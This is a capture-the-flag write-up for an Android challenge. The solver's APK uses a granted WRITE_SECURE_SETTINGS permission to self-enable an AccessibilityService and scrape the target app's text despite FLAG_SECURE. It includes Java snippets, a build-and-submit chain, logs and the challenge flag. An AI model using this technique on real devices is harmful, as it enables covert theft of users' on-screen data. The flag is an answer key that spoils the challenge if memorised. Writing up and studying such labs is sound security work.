# Ship Me

ANDROID challenge: the harness installs your APK, then ships the flag to the
pre-installed target app (`me.ship`) as a Parcelable `Uri` extra. Key idea: you
cannot re-declare `me.ship` (signature conflict), but the platform grants
`WRITE_SECURE_SETTINGS`, so self-enable an AccessibilityService and read the flag
out of the target app's window tree.

## Recon
- Statement: your app is installed with `adb install -g`; the flag is shipped via
  ```
  am start -n me.ship/.MainActivity --eu package 'shipme://cargo/?name=FLAG&origin=challenge'
  ```
- `files/shipme-release.apk` (2.1 MB). Reversed with jadx:
  - package `me.ship`, activity `me.ship.MainActivity` (exported, MAIN/LAUNCHER),
    minSdk 33, target 36.
  - `MainActivity` reads extra `"package"` as a `Uri` via
    `intent.getParcelableExtra("package", Uri.class)`, parses
    `shipme://cargo/?name=...&origin=...`, then `intent.removeExtra("package")`
    ("throw away your package").
  - `onCreate` sets FLAG_SECURE (`addFlags(8192)`), `setHideOverlayWindows(true)`,
    `setRecentsScreenshotEnabled(false)`.
  - The parsed name is rendered as a `TextView` in a package card.
- Platform `android.koth.pro`: login via `X-Auth` = team token; `POST /provision`
  (challenge + apk); logs via WebSocket `/ws/<session_id>`, captured only for tag
  `TFCCTF`.

## Analysis
- First hypothesis: submit an APK that declares `me.ship/.MainActivity` and reads
  the `"package"` extra. Confirmed wrong: the challenge APK (same package,
  different cert) is pre-installed, so the install fails —
  `[platform] Installing submitted APK` → `[error] Run failed` (UPDATE_INCOMPATIBLE).
- Breakthrough: the harness grants `WRITE_SECURE_SETTINGS` to the solve APK
  (`SELF_ENABLE_OK`), so the APK can self-enable its own AccessibilityService via
  `Settings.Secure`. FLAG_SECURE blocks screenshots but not the a11y tree.
- Dex gotcha: an anonymous inner class (`MainActivity$1`) omitted from D8 caused
  `NoClassDefFoundError`; fixed by passing **all** `.class` files to D8.

## Exploit
1. Build a `com.solver.self` APK (targetSdk 28) whose `MainActivity` self-enables
   the service:
   ```java
   Settings.Secure.putString(getContentResolver(),
       Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, COMPONENT);
   Settings.Secure.putInt(getContentResolver(),
       Settings.Secure.ACCESSIBILITY_ENABLED, 1);
   ```
   The service config sets `canRetrieveWindowContent="true"` and
   `flagRetrieveInteractiveWindows` (required for `getWindows()`).
2. Relaunch the target into the foreground (relay loop):
   ```java
   Intent i = new Intent();
   i.setComponent(new ComponentName("me.ship", "me.ship.MainActivity"));
   i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
   startActivity(i);
   ```
3. The `AccessibilityService` polls `getWindows()` / `getRootInActiveWindow()`,
   collects node text, and on finding `TFCCTF{` logs
   `Log.i("TFCCTF", "FLAG=" + flag)`.
4. Submit to the platform and read the WebSocket logs. Confirming lines from the
   run:
   ```
   I TFCCTF : SELF_START
   I TFCCTF : NOEXTRAS
   I TFCCTF : SELF_ENABLE_OK
   I TFCCTF : A11Y_NOW=com.solver.self/com.solver.self.FlagAccessibilityService
   I TFCCTF : A11Y_CONNECTED
   ```
   (The first build also printed `MAIN_ERR=...NoClassDefFoundError ... MainActivity$1`,
   the D8 dex bug; rebuild with all classes and resubmit.)

## Full chain
1. `javac` → `d8` (include ALL `.class` files) → `aapt2` → `zipalign` → `apksigner`
   (targetSdk 28)
2. `POST https://android.koth.pro/provision` (`X-Auth`, challenge=`ShipMe`, apk)
3. read `WS /ws/<session_id>` → `FLAG` line

## Flag
TFCCTF{parcelables_are_safer_not_safe}

## Lessons
- "Same package" takeover is usually blocked by a signature mismatch; use a
  different package plus an alternate read primitive.
- On a FLAG_SECURE target the accessibility tree (with
  `flagRetrieveInteractiveWindows`) still exposes `TextView` content; relaunch the
  target to the foreground before reading `getRootInActiveWindow()`.
- D8 must receive every `.class` file, including anonymous inner classes.
